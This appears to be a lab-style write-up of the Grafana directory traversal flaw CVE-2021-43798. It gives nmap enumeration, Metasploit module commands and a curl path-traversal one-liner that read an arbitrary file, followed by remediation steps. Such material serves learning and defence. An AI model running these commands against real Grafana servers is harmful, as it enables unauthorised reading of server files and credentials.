# Grafana Directory Traversal

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2021-43798 |
| **Affected Version** | Grafana 8.0.0-beta1 - 8.3.0 |
| **Attack Vector** | Network (HTTP) |
| **Impact** | Arbitrary File Read |

## Description

Grafana versions 8.0.0-beta1 through 8.3.0 contain a directory traversal vulnerability in the plugin asset loading mechanism. The application fails to properly sanitize user-supplied paths in plugin URLs, allowing an unauthenticated attacker to traverse outside the intended plugin directory and read arbitrary files from the server's filesystem.

## Enumeration

```bash
nmap -sV -sC TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 3000 | HTTP | Grafana 8.3.0 |

## Exploitation

**Module:** `auxiliary/scanner/http/grafana_plugin_traversal`

```bash
msf6 > use auxiliary/scanner/http/grafana_plugin_traversal
msf6 > set RHOSTS TARGET_IP
msf6 > set FILEPATH /secret.txt
msf6 > run
```

The module detected Grafana 8.3.0, found the `alertlist` plugin, and exploited the path traversal to read the target file. The result was saved to the Metasploit loot directory.

**Reading the loot:**

```bash
cat /root/.msf4/loot/<loot_filename>.txt
```

**Alternative (curl):**

```bash
curl --path-as-is "http://TARGET_IP:3000/public/plugins/alertlist/../../../../../../../../secret.txt"
```

## Remediation

| Action | Priority |
|--------|----------|
| Update Grafana to >= 8.3.1 / 8.2.5 / 8.1.7 / 8.0.7 | Critical |
| Restrict network access to Grafana (port 3000) | High |
| Enable authentication for all Grafana endpoints | High |
| Monitor access logs for path traversal patterns | Medium |

## References

- [CVE-2021-43798 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)
- [Grafana Security Advisory](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.5-8.1.7-and-8.0.7-released-with-high-severity-security-fix/)
